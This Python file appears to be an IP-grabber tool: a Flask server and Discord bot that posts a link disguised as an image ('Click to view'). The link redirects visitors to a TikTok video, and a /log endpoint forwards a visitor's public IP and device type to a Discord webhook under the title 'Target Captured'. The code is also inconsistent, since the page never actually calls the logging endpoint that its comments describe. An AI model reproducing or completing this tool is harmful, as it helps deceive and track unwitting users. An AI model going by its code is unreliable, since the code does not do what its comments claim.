# language: Python, file: app.py
import os
import socket
import requests
import threading
import discord
from discord.ext import commands
from flask import Flask, request, render_template_string, send_file

# Force IPv4 to prevent Railway boot hangs
_orig_getaddrinfo = socket.getaddrinfo
def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
    return _orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
socket.getaddrinfo = getaddrinfo_ipv4

app = Flask(__name__)

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
RAILWAY_URL = "https://rnbw-production.up.railway.app"
# ---------------------

@app.route('/')
def index():
    # This page is what Discord scrapes. It looks like an image page.
    # The og:image points to your image.png
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta property="og:type" content="website">
        <meta property="og:title" content="Click to view">
        <meta property="og:image" content="https://rnbw-production.up.railway.app/image.png">
        <script>
            // The moment they click the embed, this script runs
            window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
        </script>
    </head>
    <body></body>
    </html>
    """

@app.route('/image.png')
def serve_image():
    # We serve the image from the Railway server, not from GitHub
    # You must upload your image to GitHub and name it image.png
    try:
        return send_file("image.png", mimetype='image/png')
    except:
        return "Image not found", 404

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ip = data.get('ip', 'Unknown')
    ua = data.get('ua', 'Unknown')
    
    device = "Unknown"
    if "Windows" in ua: device = "Windows PC"
    elif "iPhone" in ua: device = "iPhone"
    elif "Android" in ua: device = "Android"
    elif "Macintosh" in ua: device = "Mac"

    payload = {
        "embeds": [{
            "title": "Target Captured",
            "color": 65280,
            "fields": [
                {"name": "Device Name", "value": f"```{device}```", "inline": False},
                {"name": "Public IP", "value": f"```{ip}```", "inline": False}
            ]
        }]
    }
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=payload)
    return "ok", 200

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}', flush=True)

@bot.command()
async def send(ctx):
    # We send the raw URL. Discord will scrape the og:image, show the picture.
    # When they click the picture, they hit the / route, which redirects them.
    await ctx.send(f"<{RAILWAY_URL}>")

def run_bot():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN missing.", flush=True)
        return
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"BOT CRASHED: {e}", flush=True)

threading.Thread(target=run_bot, daemon=True).start()
